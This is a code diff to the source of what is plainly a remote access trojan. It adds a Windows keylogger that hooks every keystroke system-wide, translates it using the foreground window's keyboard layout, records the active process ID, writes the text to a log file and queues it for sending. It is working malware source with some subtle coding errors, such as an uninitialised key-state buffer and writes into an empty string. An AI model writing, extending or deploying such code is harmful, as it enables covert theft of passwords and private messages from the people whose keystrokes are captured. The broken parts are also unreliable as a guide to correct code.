@@ -1,20 +1,46 @@
 #include "rat.h"
-#include "../helper/log.h"
+#include "../helper/debug.h"
 #include <fstream>
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+static KeyloggedMessageQueue keyloggedInfoQueue;
+
+LRESULT CALLBACK ParseAndUpdateSendQueue(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 		if (wParam == WM_KEYDOWN) {
 			KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
-			DWORD vkCode = kbd->vkCode;
+			PBYTE lpKeyState = { 0 };
+			DWORD foregroundProcessId;
+			HKL keyboardLayout = GetKeyboardLayout(
+				GetWindowThreadProcessId(GetForegroundWindow(), &foregroundProcessId)
+			);
+			if (!keyboardLayout) {
+				LOG_MSG("Error %u in LoadKeyboardLayout.\n", GetLastError());
+			}
+			
+			std::wstring translatedMessage;
+			int nWritten = ToUnicodeEx(
+				kbd->vkCode,
+				kbd->scanCode,
+				lpKeyState,
+				&translatedMessage[0],
+				Keylogging::MAX_LENGTH_OF_TRANSLATED_MESSAGE,
+				Keylogging::TRANSLATE_KEY_BREAK_SCAN_CODES,
+				keyboardLayout
+			);
 
-			// Currently only simple chars
-			if (vkCode >= 0x30 && vkCode <= 0x5A) {
-				std::ofstream log;
-				log.open("D:/log.txt", std::ios::app);
-				log << (char)vkCode;
+			std::ofstream log;
+			log.open("D:/log.txt", std::ios::app);
+
+			if (nWritten > 0) {
+				LOG_MSG("Written %i to translatedMessage from foregrounded process with PID %i \n", nWritten, foregroundProcessId);
+				keyloggedInfoQueue.append(translatedMessage);
+				log << translatedMessage.c_str();
 				log.close();
 			}
+			else {
+				LOG_MSG("Written nothing");
+			}
+
 		}
 	}
 
@@ -102,9 +128,5 @@ void RAT::startRealtimeKeylogger() {
 	}
 
 	LOG_MSG("Data available: %u", dataSize);
-
-	// -- Start Keylogging -- 
-	using namespace Keylogging;
-	std::string message;
-	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, NULL, ALL_THREADS);
+	SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)ParseAndUpdateSendQueue, NULL, Keylogging::ALL_THREADS);
 }
